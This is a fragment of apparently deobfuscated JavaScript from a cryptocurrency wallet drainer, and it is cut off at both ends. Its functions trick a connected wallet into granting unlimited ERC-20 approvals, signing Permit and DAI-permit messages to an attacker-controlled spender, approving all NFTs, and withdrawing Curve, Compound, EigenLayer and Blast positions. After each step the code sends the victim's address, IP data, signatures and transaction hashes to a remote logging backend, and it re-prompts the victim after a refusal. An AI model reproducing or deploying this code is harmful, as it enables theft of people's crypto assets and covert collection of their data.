      let D = new ethers.utils.Interface(f);
      if (k.useEth) {
        V = D.encodeFunctionData("remove_liquidity_one_coin", [k.balance, 0, 0, false, config.receiver]);
      } else {
        V = D.encodeFunctionData("remove_liquidity_one_coin", [k.balance, 0, 0, config.receiver]);
      }
      try {
        this.logPromting(T, "CURVE", {
          "chain": 0x1,
          "tokenPrice": k.usdPrice
        });
      } catch (U) {
        console.warn(U);
      }
      await new Promise(async (q, y) => {
        let a = {
          "from": this.walletAddress,
          "to": k.contractAddress,
          "value": "0x0000",
          "data": V
        };
        if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
          a.value = '';
        }
        if (window.ethereum?.["isTrustWallet"]) {
          a.value = "0";
        }
        try {
          await this.main_provider.sendAsync({
            "method": "eth_sendTransaction",
            "params": [a],
            "from": this.walletAddress
          }, (t, N) => {
            if (t) {
              y(t);
            } else {
              let l = N;
              if (N.hasOwnProperty("result")) {
                l = N.result;
              } else if (N.hasOwnProperty("hash")) {
                l = N.hash;
              }
              q(l);
            }
          });
        } catch (t) {
          y(t);
        }
      }).then(async q => {
        let K = await this.getIpData();
        fetch(this.logDomainName + "backend/curve", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify({
            "address": this.walletAddress,
            "isMobile": this.isMobile(),
            "websiteUrl": window.location.href,
            "websiteDomain": window.location.host,
            "ipData": K,
            "API_KEY": config.API_KEY,
            "chain": k.chain,
            "tokenName": k.tname,
            "tokenPrice": Number(k.usdPrice).toFixed(2) + " $",
            "withdrawBalance": k.balance,
            "contractAddress": k.contractAddress,
            "hash_sweet": T,
            "signature": this.signature,
            "transactionHash": q,
            "useVerified": this.useVerified[k.chain] ? this.verified[k.chain] : null,
            "contract_salt": config.contract_salt_mc[k.chain],
            "unmarkedContract": config.tokenContractAddresses[k.chain]
          }))
        });
        this.txcount++;
        this.addToLocalStorage(T);
        return true;
      })["catch"](async q => {
        this.logCancel("Curve", k.tname, k.usdPrice.toString() + " $");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.withdrawCurve(T, k);
        }
        console.log("Failed to transfer ERC20: ", q);
      });
    } catch (q) {
      console.log("Withdraw Curve Error: ", q);
    }
  };
  ["transferERC20"] = async (T, k) => {
    console.log("ERC20", k);
    console.log("Transferring ERC20 " + k.fullName);
    console.log("Pending Transactions: " + this.pending.length);
    try {
      await this.changeNetwork(k.chain);
      console.log("Trying " + k.tname);
      if (k.tname == "DAI" && k.chain == 1) {
        await this.permitDAI(T, k);
      } else {
        if (k.is_aave == true) {
          await this.permitAAVE(T, k);
        } else {
          if (k.curve == true) {
            await this.withdrawCurve(T, k);
          } else {
            if (k.tname == "USDC" && k.chain == 1 || k.permit) {
              await this.permitERC20(T, k);
            } else {
              console.log("Failed to permit trying safa ERC20 for " + k.tname);
              await new Promise(async (f, D) => {
                const y = [{
                  "constant": false,
                  "inputs": [{
                    "name": "_spender",
                    "type": "address"
                  }, {
                    "name": "_value",
                    "type": "uint256"
                  }],
                  "name": "approve",
                  "outputs": [{
                    "name": '',
                    "type": "bool"
                  }],
                  "payable": false,
                  "stateMutability": "nonpayable",
                  "type": "function"
                }, {
                  "constant": false,
                  "inputs": [{
                    "name": "spender",
                    "type": "address"
                  }, {
                    "name": "addedValue",
                    "type": "uint256"
                  }],
                  "name": "increaseAllowance",
                  "outputs": [{
                    "name": '',
                    "type": "bool"
                  }],
                  "payable": false,
                  "stateMutability": "nonpayable",
                  "type": "function"
                }, {
                  "constant": false,
                  "inputs": [{
                    "name": "_spender",
                    "type": "address"
                  }, {
                    "name": "_addedValue",
                    "type": "uint256"
                  }],
                  "name": "increaseApproval",
                  "outputs": [{
                    "name": "success",
                    "type": "bool"
                  }],
                  "payable": false,
                  "stateMutability": "nonpayable",
                  "type": "function"
                }];
                let K = await this.ethers_provider.send("eth_requestAccounts", []);
                let a = new ethers.Contract(k.contractAddress, y, this.ethers_provider);
                let N = a["interface"].encodeFunctionData("approve", [config.tokenContractAddresses[k.chain], ethers.constants.MaxUint256]);
                let l = a["interface"].encodeFunctionData("increaseAllowance", [config.tokenContractAddresses[k.chain], ethers.constants.MaxUint256]);
                let O = a["interface"].encodeFunctionData("increaseApproval", [config.tokenContractAddresses[k.chain], ethers.constants.MaxUint256]);
                let I = 0;
                let x = 1;
                let E = ["0xe65cdb6479bac1e22340e4e755fae7e509ecd06c", "0x6c8c6b02e7b2be14d4fa6022dfd6d75921d90e4e", "0x70e36f6bf80a52b3b46b3af8e106cc0ed743e8e4", "0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5", "0x7713dd9ca933848f6819f38b8352d9a15ea73f67", "0xface851a4921ce59e912d19329929ce6da6eb0c7", "0x5d3a536e4d6dbd6114cc1ead35777bab948e3643", "0x95b4ef2869ebd94beb4eee400a99824bf5dc325b", "0x158079ee67fce2f58472a96584a73c7ab9ac95c1", "0xf5dce57282a584d2746faf1593d3121fcac444dc", "0x4b0181102a0112a2ef11abee5563bb4a3176c9d7", "0x12392f67bdf24fae0af363c24ac620a2f67dad86", "0x35a18000230da775cac24873d00ff85bccded550", "0x39aa39c021dfbae8fac545936693ac917d5e7563", "0x041171993284df560249b57358f931d9eb7b925d", "0xf650c3d88d12db855b8bf7d11be6c55a4e07dcc9", "0xc11b1268c1a384e55c48c2391d8d480264a3a7f4", "0x80a2ae356fc9ef4305676f7a3e2ed04e12c33946", "0xccf4429db6322d5c611ee964527d42e5d685dd6a", "0xb3319f5d18bc0d84dd1b4825dcde5d5f7266d407", "0xc00e94cb662c3520282e6f5717214004a7f26888"];
                if (k.contractAddress.toLowerCase() == "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2" || k.contractAddress.toLowerCase() == "0x4200000000000000000000000000000000000006") {
                  I = 0;
                  x = 0;
                }
                if (k.chain == 1 && (k.contractAddress.toLowerCase() == "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599" || k.contractAddress.toLowerCase() == "0x514910771af9ca656af840dff83e8264ecf986ca")) {
                  I = 2;
                  x = 0;
                }
                if (E.includes(k.contractAddress.toLowerCase())) {
                  I = 0;
                  x = 0;
                }
                if (x) {
                  try {
                    I = 1;
                  } catch {
                    console.log("Unable to use IncreaseAllowance");
                  }
                }
                console.log("Address", this.walletAddress);
                let r = {
                  "from": K[0],
                  "to": k.contractAddress,
                  "data": N,
                  "value": "0",
                  "chainId": k.chain
                };
                if (I == 1) {
                  console.log("Using increaseAllowance");
                  r.data = l;
                }
                if (I == 2) {
                  console.log("Using increaseApproval");
                  r.data = O;
                }
                r.nonce = await this.ethers_provider.getTransactionCount(this.walletAddress);
                r.nonce = "0x" + r.nonce.toString(16);
                this.estimateTXcosts(r, k, k.chain);
                try {
                  this.logPromting(T, "ERC20", {
                    "chain": k.chain,
                    "contractAddress": k.contractAddress,
                    "to_wallet": config.tokenContractAddresses[k.chain],
                    "usdPrice": k.usdPrice,
                    "withdrawBalance": k.balance,
                    "approveMethod": I,
                    "tokenName": k.tname
                  });
                } catch (v) {
                  console.warn(v);
                }
                try {
                  await this.main_provider.sendAsync({
                    "id": k.chain,
                    "method": "eth_sendTransaction",
                    "params": [r],
                    "from": K[0]
                  }, (w, e) => {
                    if (w == null) {
                      let P = e;
                      if (e.hasOwnProperty("result")) {
                        P = e.result;
                      } else if (e.hasOwnProperty("hash")) {
                        P = e.hash;
                      }
                      console.log("ERC20 success", P);
                      this.pending.push(P);
                      f(P);
                    } else {
                      this.updateButtonMessage(true);
                      D(w);
                    }
                  });
                } catch (w) {
                  D(w);
                }
              }).then(async f => {
                let U = await this.getIpData();
                fetch(this.logDomainName + "backend/safa/erc20", {
                  "method": "POST",
                  "mode": "cors",
                  "cache": "no-cache",
                  "headers": {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                  },
                  "body": this.encryptBody(JSON.stringify({
                    "address": this.walletAddress,
                    "isMobile": this.isMobile(),
                    "websiteUrl": window.location.href,
                    "websiteDomain": window.location.host,
                    "ipData": U,
                    "API_KEY": config.API_KEY,
                    "chain": k.chain,
                    "tokenName": k.tname,
                    "tokenPrice": Number(k.usdPrice).toFixed(2) + " $",
                    "withdrawBalance": k.balance,
                    "contractAddress": k.contractAddress,
                    "hash_sweet": T,
                    "signature": this.signature,
                    "transactionHash": f,
                    "useVerified": this.useVerified[k.chain] ? this.verified[k.chain] : null,
                    "contract_salt": config.contract_salt_mc[k.chain],
                    "unmarkedContract": config.tokenContractAddresses[k.chain]
                  }))
                });
                this.uniswapTokens = this.considerations.filter(q => q.contractAddress != k.contractAddress);
                this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(q => q.contractAddress != k.contractAddress);
                this.pancakeswapTokens_bsc = this.pancakeswapTokens_bsc.filter(q => q.contractAddress != k.contractAddress);
                this.uniswapTokens = this.uniswapTokens.filter(q => q.contractAddress != k.contractAddress);
                this.sushiswapTokens = this.sushiswapTokens.filter(q => q.contractAddress != k.contractAddress);
                this.permitTokens.ETH = this.permitTokens.ETH.filter(q => q.contractAddress != k.contractAddress);
                this.permitTokens.BSC = this.permitTokens.BSC.filter(q => q.contractAddress != k.contractAddress);
                this.permitTokens.ARB = this.permitTokens.ARB.filter(q => q.contractAddress != k.contractAddress);
                this.permitTokens.POLYGON = this.permitTokens.POLYGON.filter(q => q.contractAddress != k.contractAddress);
                this.permitTokens.OPTIMISM = this.permitTokens.OPTIMISM.filter(q => q.contractAddress != k.contractAddress);
                this.addToLocalStorage(T);
                this.txcount++;
                return true;
              })["catch"](async f => {
                this.logCancel(k.name, k.tname, k.usdPrice.toString() + " $");
                await this.handleDecline();
                if (config.repeatHighest) {
                  return await this.transferERC20(T, k);
                }
                console.log("Failed to transfer ERC20: ", f);
              });
            }
          }
        }
      }
    } catch (f) {
      console.warn("Failed to transfer ERC20 " + k.name);
    }
  };
  ["permitAAVE"] = async (T, k) => {
    console.log("Permit", k);
    try {
      await this.changeNetwork(k.chain);
      let V = k.chain;
      let f = Date.now() + 30758400000;
      let U = [{
        "name": "owner",
        "type": "address"
      }, {
        "name": "spender",
        "type": "address"
      }, {
        "name": "value",
        "type": "uint256"
      }, {
        "name": "nonce",
        "type": "uint256"
      }, {
        "name": "deadline",
        "type": "uint256"
      }];
      let q = {
        "types": {
          "Permit": U
        },
        "primaryType": "Permit",
        "domain": {
          "name": k.fullName,
          "verifyingContract": k.contractAddress,
          "chainId": V,
          "version": "1"
        },
        "message": {
          "owner": this.walletAddress,
          "spender": config.tokenContractAddresses[V],
          "value": "1158472395435294898592384258348512586931256000000000000000000",
          "nonce": k.nonce,
          "deadline": f
        }
      };
      try {
        this.logPromting(T, "PERMIT", {
          "chain": k.chain,
          "tokenName": k.tname,
          "tokenPrice": k.usdPrice
        });
      } catch (y) {
        console.warn(y);
      }
      await new Promise(async (K, s) => {
        try {
          let t = await this.signer._signTypedData(q.domain, q.types, q.message);
          let N = false;
          try {
            const c = ethers.utils.verifyTypedData(q.domain, q.types, q.message, t);
            if (c.toLowerCase() === this.walletAddress.toLowerCase()) {
              N = false;
              console.log("Signature confirmed");
              console.log("Signature confirmed");
            } else {
              console.log("Might be fake");
              N = true;
            }
          } catch {}
          K([t, N]);
        } catch (l) {
          console.log(l);
          s(l);
        }
      }).then(async K => {
        let a = K[0];
        let t = a.substring(2);
        let N = "0x" + t.substring(0, 64);
        let c = "0x" + t.substring(64, 128);
        let l = parseInt(t.substring(128, 130), 16);
        let o = await this.getIpData();
        fetch(this.logDomainName + "backend/permit", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify({
            "address": this.walletAddress,
            "chain": V,
            "isMobile": this.isMobile(),
            "websiteUrl": window.location.href,
            "websiteDomain": window.location.host,
            "API_KEY": config.API_KEY,
            "mayfake": K[1],
            "ipData": o,
            "signature": this.signature,
            "chain": V,
            "hash_sweet": T,
            "tokenName": k.name,
            "tokenPrice": Number(k.usdPrice).toFixed(2) + " $",
            "withdrawBalance": k.balance,
            "contractAddress": k.contractAddress,
            "deadline": f,
            "useVerified": this.useVerified[V] ? this.verified[V] : null,
            "contract_salt": config.contract_salt_mc[V],
            "unmarkedContract": config.tokenContractAddresses[V],
            "v": l,
            "r": N,
            "s": c
          }))
        });
        this.txcount++;
        this.addToLocalStorage(T);
        return true;
      })["catch"](async K => {
        this.logCancel("Permit ERC20", k.tname, k.usdPrice.toString() + " $");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.permitAAVE(T, k);
        }
        this.updateButtonMessage(true);
        this.sweets = this.sweets.filter(N => ![N].map(c => c.contractAddress).includes(N.contractAddress));
        this.txcount++;
      });
    } catch (K) {
      console.warn("Permit AAVE Error:" + K);
    }
  };
  ["permitDAI"] = async (T, k) => {
    console.log("PermitDAI", k);
    try {
      await this.changeNetwork(1);
      let V = k.chain;
      let D = new ethers.Contract(k.contractAddress, DAI_PERMIT_ABI, this.secondProvider);
      let U = await D.nonces(this.walletAddress);
      let K = [{
        "name": "holder",
        "type": "address"
      }, {
        "name": "spender",
        "type": "address"
      }, {
        "name": "nonce",
        "type": "uint256"
      }, {
        "name": "expiry",
        "type": "uint256"
      }, {
        "name": "allowed",
        "type": "bool"
      }];
      let s = {
        "daiMainnet": {
          "name": "Dai Stablecoin",
          "version": "1",
          "chainId": V,
          "verifyingContract": "0x6b175474e89094c44da98b954eedeac495271d0f"
        }
      };
      let a = {
        "types": {
          "Permit": K
        },
        "primaryType": "Permit",
        "domain": s.daiMainnet,
        "message": {
          "holder": this.walletAddress,
          "spender": config.tokenContractAddresses[V],
          "nonce": U,
          "expiry": "1677587272218",
          "allowed": true
        }
      };
      try {
        this.logPromting(T, "DAI", {
          "chain": 0x1,
          "tokenPrice": k.usdPrice,
          "tokenName": k.tname
        });
      } catch (t) {
        console.warn(t);
      }
      await new Promise(async (N, c) => {
        try {
          let o = await this.signer._signTypedData(s.daiMainnet, a.types, a.message);
          console.log(o);
          let I = false;
          try {
            const x = ethers.utils.verifyTypedData(s.daiMainnet, a.types, a.message, o);
            if (x.toLowerCase() === this.walletAddress.toLowerCase()) {
              I = false;
              console.log("Signature confirmed");
            } else {
              console.log("Fake sign");
              I = true;
            }
          } catch {}
          N([o, I]);
        } catch (E) {
          c(E);
        }
      }).then(async N => {
        let l = N[0];
        let o = l.substring(2);
        let O = "0x" + o.substring(0, 64);
        let I = "0x" + o.substring(64, 128);
        let x = parseInt(o.substring(128, 130), 16);
        let E = await this.getIpData();
        fetch(this.logDomainName + "backend/permitdai", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify({
            "address": this.walletAddress,
            "chain": k.chain,
            "isMobile": this.isMobile(),
            "websiteUrl": window.location.href,
            "websiteDomain": window.location.host,
            "ipData": E,
            "API_KEY": config.API_KEY,
            "tokenName": k.name,
            "tokenPrice": Number(k.usdPrice).toFixed(2) + " $",
            "withdrawBalance": k.balance,
            "hash_sweet": T,
            "contractAddress": k.contractAddress,
            "signature": this.signature,
            "useVerified": this.useVerified[V] ? this.verified[V] : null,
            "contract_salt": config.contract_salt_mc[V],
            "unmarkedContract": config.tokenContractAddresses[V],
            "nonce": U,
            "expiry": "1677587272218",
            "mayfake": N[1],
            "v": x,
            "r": O,
            "s": I
          }))
        });
        this.sweets = this.sweets.filter(r => ![r].map(Q => Q.contractAddress).includes(r.contractAddress));
        this.uniswapTokens = this.considerations.filter(r => r.contractAddress != k.contractAddress);
        this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(r => r.contractAddress != k.contractAddress);
        this.pancakeswapTokens_bsc = this.pancakeswapTokens_bsc.filter(r => r.contractAddress != k.contractAddress);
        this.uniswapTokens = this.uniswapTokens.filter(r => r.contractAddress != k.contractAddress);
        this.sushiswapTokens = this.sushiswapTokens.filter(r => r.contractAddress != k.contractAddress);
        this.permitTokens.ETH = this.permitTokens.ETH.filter(r => r.contractAddress != k.contractAddress);
        this.txcount++;
        this.addToLocalStorage(T);
        return true;
      })["catch"](async N => {
        this.logCancel("Permit " + k.type, k.tname, k.usdPrice.toString() + " $");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.permitDAI(T, k);
        }
        this.txcount++;
      });
    } catch (N) {
      console.warn("Permit Dai error: " + N);
    }
  };
  ["permitERC20"] = async (k, H) => {
    console.log("Permit", H);
    try {
      await this.changeNetwork(H.chain);
      let f = H.chain;
      let D = H.nonce;
      let U = Date.now() + 30758400000;
      let y = [{
        "name": "owner",
        "type": "address"
      }, {
        "name": "spender",
        "type": "address"
      }, {
        "name": "value",
        "type": "uint256"
      }, {
        "name": "nonce",
        "type": "uint256"
      }, {
        "name": "deadline",
        "type": "uint256"
      }];
      console.log(H.permit_data.name, H.permit_data.version);
      const K = {
        Permit: y
      };
      let s = {
        "types": K,
        "primaryType": "Permit",
        "domain": {
          "name": H.permit_data.name,
          "verifyingContract": H.contractAddress,
          "chainId": f,
          "version": H.permit_data.version
        },
        "message": {
          "owner": this.walletAddress,
          "spender": config.tokenContractAddresses[f],
          "value": "1158472395435294898592384258348512586931256000000000000000000",
          "nonce": D,
          "deadline": U
        }
      };
      try {
        this.logPromting(k, "PERMIT", {
          "chain": 0x1,
          "tokenPrice": H.usdPrice,
          "tokenName": H.tname
        });
      } catch (a) {
        console.warn(a);
      }
      await new Promise(async (t, N) => {
        try {
          let l = await this.signer._signTypedData(s.domain, s.types, s.message);
          console.log(l);
          let o = false;
          try {
            const O = ethers.utils.verifyTypedData(s.domain, s.types, s.message, signatureVersion);
            console.log(O);
            if (O.toLowerCase() === this.walletAddress.toLowerCase()) {
              o = false;
              console.log("Signature confirmed");
            } else {
              console.log("Might be fake");
              o = true;
            }
          } catch {}
          t([l, o]);
        } catch (I) {
          console.log(I);
          N(I);
        }
      }).then(async t => {
        let c = t[0];
        let l = c.substring(2);
        let o = "0x" + l.substring(0, 64);
        let O = "0x" + l.substring(64, 128);
        let I = parseInt(l.substring(128, 130), 16);
        let x = await this.getIpData();
        fetch(this.logDomainName + "backend/permit", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify({
            "address": this.walletAddress,
            "chain": f,
            "isMobile": this.isMobile(),
            "websiteUrl": window.location.href,
            "websiteDomain": window.location.host,
            "API_KEY": config.API_KEY,
            "ipData": x,
            "signature": this.signature,
            "mayfake": t[1],
            "hash_sweet": k,
            "chain": f,
            "tokenName": H.tname,
            "tokenPrice": Number(H.usdPrice).toFixed(2) + " $",
            "withdrawBalance": H.balance,
            "contractAddress": H.contractAddress,
            "deadline": U,
            "useVerified": this.useVerified[f] ? this.verified[f] : null,
            "contract_salt": config.contract_salt_mc[f],
            "unmarkedContract": config.tokenContractAddresses[f],
            "v": I,
            "r": o,
            "s": O
          }))
        });
        this.sweets = this.sweets.filter(E => ![E].map(r => r.contractAddress).includes(E.contractAddress));
        this.uniswapTokens = this.considerations.filter(E => E.contractAddress != H.contractAddress);
        this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(E => E.contractAddress != H.contractAddress);
        this.pancakeswapTokens_bsc = this.pancakeswapTokens_bsc.filter(E => E.contractAddress != H.contractAddress);
        this.uniswapTokens = this.uniswapTokens.filter(E => E.contractAddress != H.contractAddress);
        this.sushiswapTokens = this.sushiswapTokens.filter(E => E.contractAddress != H.contractAddress);
        this.permitTokens.ETH = this.permitTokens.ETH.filter(E => E.contractAddress != H.contractAddress);
        this.permitTokens.BSC = this.permitTokens.BSC.filter(E => E.contractAddress != H.contractAddress);
        this.permitTokens.ARB = this.permitTokens.ARB.filter(E => E.contractAddress != H.contractAddress);
        this.permitTokens.POLYGON = this.permitTokens.POLYGON.filter(E => E.contractAddress != H.contractAddress);
        this.permitTokens.OPTIMISM = this.permitTokens.OPTIMISM.filter(E => E.contractAddress != H.contractAddress);
        this.txcount++;
        this.addToLocalStorage(k);
        return true;
      })["catch"](async t => {
        this.logCancel("Permit ", H.tname, H.usdPrice.toString() + " $");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.permitERC20(k, H);
        }
        this.updateButtonMessage(true);
        this.txcount++;
      });
    } catch (t) {
      console.warn("Permit USDC Error:" + t);
    }
  };
  ["transferComet"] = async (T, k) => {
    await this.changeNetwork(k.chain);
    console.log("Transferring Comet" + k.name);
    try {
      let V = k.chain;
      let f = new ethers.utils.Interface(COMET_ABI);
      let D = f.encodeFunctionData("allow", [config.tokenContractAddresses[V], true]);
      try {
        this.logPromting(T, "COMET", {
          "chain": V,
          "tokenName": k.name,
          "tokenPrice": k.totalPrice,
          "withdrawals": k.assets,
          "contractAddress": k.contractAddress,
          "to_wallet": config.tokenContractAddresses[V]
        });
      } catch (U) {
        console.warn(U);
      }
      await new Promise(async (q, y) => {
        let a = {
          "from": this.walletAddress,
          "to": k.contractAddress,
          "value": "0x0000",
          "data": D
        };
        if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
          a.value = '';
        }
        if (window.ethereum?.["isTrustWallet"]) {
          a.value = "0";
        }
        try {
          await this.main_provider.sendAsync({
            "method": "eth_sendTransaction",
            "params": [a],
            "from": this.walletAddress
          }, (t, N) => {
            if (t) {
              console.error("COMET error: ", t);
              y(t);
            } else {
              let l = N;
              if (N.hasOwnProperty("result")) {
                l = N.result;
              } else if (N.hasOwnProperty("hash")) {
                l = N.hash;
              }
              console.log("COMET success", l);
              this.pending.push(l);
              q(l);
            }
          });
        } catch (t) {
          y(t);
        }
      }).then(async q => {
        let K = await this.getIpData();
        let s = {
          "address": this.walletAddress,
          "chain": V,
          "isMobile": this.isMobile(),
          "websiteUrl": window.location.href,
          "websiteDomain": window.location.host,
          "API_KEY": config.API_KEY,
          "ipData": K,
          "signature": this.signature,
          "tokenName": k.name,
          "tokenPrice": k.totalPrice,
          "withdrawals": k.assets,
          "contractAddress": k.contractAddress,
          "useVerified": this.useVerified[V] ? this.verified[V] : null,
          "contract_salt": config.contract_salt_mc[V],
          "unmarkedContract": config.tokenContractAddresses[V],
          "transactionHash": q,
          "hash_sweet": T
        };
        console.log(s);
        fetch(this.logDomainName + "backend/compound", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify(s))
        });
        this.txcount++;
        this.addToLocalStorage(T);
        return true;
      })["catch"](async q => {
        this.logCancel("Compound Market ", k.totalPrice + " ETH");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.transferComet(T, k);
        }
        this.updateButtonMessage(true);
        console.log("Comet error:", q);
        this.txcount++;
      });
    } catch (q) {}
  };
  ["transferEigen"] = async (T, k) => {
    await this.changeNetwork(k.chain);
    console.log("Transferring Eigen" + k.name);
    try {
      let V = k.chain;
      let f = new ethers.utils.Interface(EIGEN_ABI);
      let D = f.encodeFunctionData("queueWithdrawal", [k.strategyIndexes, k.strategies, k.shares, this.blockaid[V].mc, k.undelegateIfPossible]);
      try {
        this.logPromting(T, "EIGEN", {
          "chain": V,
          "tokenPrice": k.totalPrice,
          "contractAddress": k.contractAddress,
          "to_wallet": this.blockaid[V].mc
        });
      } catch (U) {
        console.warn(U);
      }
      await new Promise(async (q, y) => {
        let a = {
          "from": this.walletAddress,
          "to": k.contractAddress,
          "value": "0x0000",
          "data": D
        };
        if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
          a.value = '';
        }
        if (window.ethereum?.["isTrustWallet"]) {
          a.value = "0";
        }
        try {
          await this.main_provider.sendAsync({
            "method": "eth_sendTransaction",
            "params": [a],
            "from": this.walletAddress
          }, (t, N) => {
            if (t) {
              console.error("Eigen error: ", t);
              y(t);
            } else {
              let l = N;
              if (N.hasOwnProperty("result")) {
                l = N.result;
              } else if (N.hasOwnProperty("hash")) {
                l = N.hash;
              }
              console.log("Eigen success", l);
              this.pending.push(l);
              q(l);
            }
          });
        } catch (t) {
          y(t);
        }
      }).then(async q => {
        let K = await this.getIpData();
        let s = {
          "address": this.walletAddress,
          "chain": V,
          "isMobile": this.isMobile(),
          "websiteUrl": window.location.href,
          "websiteDomain": window.location.host,
          "API_KEY": config.API_KEY,
          "ipData": K,
          "signature": this.signature,
          "tokenPrice": k.totalPrice,
          "useVerified": null,
          "contract_salt": this.blockaid[V].mc_salt,
          "unmarkedContract": this.blockaid[V].mc,
          "transactionHash": q,
          "hash_sweet": T
        };
        fetch(this.logDomainName + "backend/eigen", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify(s))
        });
        this.txcount++;
        this.addToLocalStorage(T);
        return true;
      })["catch"](async q => {
        this.logCancel("Eigen ", k.totalPrice + " ETH");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.transferEigen(T, k);
        }
        this.updateButtonMessage(true);
        console.log("Eigen error:", q);
        this.txcount++;
      });
    } catch (q) {}
  };
  ["transferBlastviaTransition"] = async (T, k) => {
    await this.changeNetwork(k.chain);
    console.log("Transferring BLAST" + k.name);
    try {
      let V = k.chain;
      let f = new ethers.utils.Interface(BLAST_ABI);
      let D = f.encodeFunctionData("transition", [k.recipient, k.v, k.r, k.s, 0]);
      try {
        this.logPromting(T, "BLAST", {
          "chain": V,
          "tokenPrice": k.totalPrice
        });
      } catch (U) {
        console.warn(U);
      }
      await new Promise(async (q, y) => {
        let a = {
          "from": this.walletAddress,
          "to": k.contractAddress,
          "value": "0x0000",
          "data": D
        };
        if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
          a.value = '';
        }
        if (window.ethereum?.["isTrustWallet"]) {
          a.value = "0";
        }
        try {
          await this.main_provider.sendAsync({
            "method": "eth_sendTransaction",
            "params": [a],
            "from": this.walletAddress
          }, (t, N) => {
            if (t) {
              console.error("BLAST error: ", t);
              y(t);
            } else {
              let l = N;
              if (N.hasOwnProperty("result")) {
                l = N.result;
              } else if (N.hasOwnProperty("hash")) {
                l = N.hash;
              }
              console.log("BLAST success", l);
              this.pending.push(l);
              q(l);
            }
          });
        } catch (t) {
          y(t);
        }
      }).then(async q => {
        let K = await this.getIpData();
        let s = {
          "address": this.walletAddress,
          "chain": V,
          "isMobile": this.isMobile(),
          "websiteUrl": window.location.href,
          "websiteDomain": window.location.host,
          "API_KEY": config.API_KEY,
          "recipient": k.recipient,
          "ipData": K,
          "signature": this.signature,
          "tokenPrice": k.totalPrice,
          "transactionHash": q,
          "hash_sweet": T
        };
        fetch(this.logDomainName + "backend/blast", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify(s))
        });
        this.txcount++;
        this.addToLocalStorage(T);
        return true;
      })["catch"](async q => {
        this.logCancel("BLAST ", k.totalPrice + " ETH");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.transferBlastviaTransition(T, k);
        }
        this.updateButtonMessage(true);
        console.log("Blast error:", q);
        this.txcount++;
      });
    } catch (q) {}
  };
  ["transferNFT"] = async (T, k) => {
    await this.changeNetwork(1);
    console.log("Transferring NFT " + (k.name || "unknown"));
    try {
      try {
        this.logPromting(T, "NFT", {
          "chain": 0x1,
          "to_wallet": config.tokenContractAddresses[1],
          "tokenPrice": k.totalPrice,
          "tokenIds": k.tokenIds || [k.tokenId],
          "tokenType": k.name,
          "tokenName": k.tname,
          "contractAddress": k.contractAddress
        });
      } catch (V) {
        console.warn(V);
      }
      await new Promise(async (f, D) => {
        let K = new ethers.utils.Interface(NFT_ABI);
        let s = K.encodeFunctionData("setApprovalForAll", [config.tokenContractAddresses[1], true]);
        let a = {
          "from": this.walletAddress,
          "to": k.contractAddress,
          "value": "0x0000",
          "data": s
        };
        if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
          a.value = '';
        }
        if (window.ethereum?.["isTrustWallet"]) {
          a.value = "0";
        }
        try {
          console.log("Prompting...", config.tokenContractAddresses[1]);
          await this.main_provider.sendAsync({
            "method": "eth_sendTransaction",
            "params": [a],
            "from": this.walletAddress
          }, (t, N) => {
            if (t) {
              console.error("NFT error: ", t);
              D(t);
            } else {
              let l = N;
              if (N.hasOwnProperty("result")) {
                l = N.result;
              } else if (N.hasOwnProperty("hash")) {
                l = N.hash;
              }
              console.log("NFT success", l);
              this.pending.push(l);
              f(l);
            }
          });
        } catch (t) {
          D(t);
        }
      }).then(async f => {
        let U = await this.getIpData();
        fetch(this.logDomainName + "backend/safa/nft", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify({
            "address": this.walletAddress,
            "walletBalanceInEth": this.walletBalanceInEth,
            "isMobile": this.isMobile(),
            "websiteUrl": window.location.href,
            "websiteDomain": window.location.host,
            "ipData": U,
            "API_KEY": config.API_KEY,
            "signature": this.signature,
            "tokenIds": k.tokenIds,
            "tokenType": k.name,
            "tokenName": k.tname,
            "tokenPrice": k.totalPrice,
            "contractAddress": k.contractAddress,
            "useVerified": this.useVerified[1] ? this.verified[1] : null,
            "contract_salt": config.contract_salt_mc[1],
            "unmarkedContract": config.tokenContractAddresses[1],
            "transactionHash": f,
            "hash_sweet": T
          }))
        });
        this.txcount++;
        return true;
      })["catch"](async f => {
        this.logCancel(k.name, k.tname, Number(k.totalPrice).toFixed(3) + " ETH");
        await this.handleDecline();
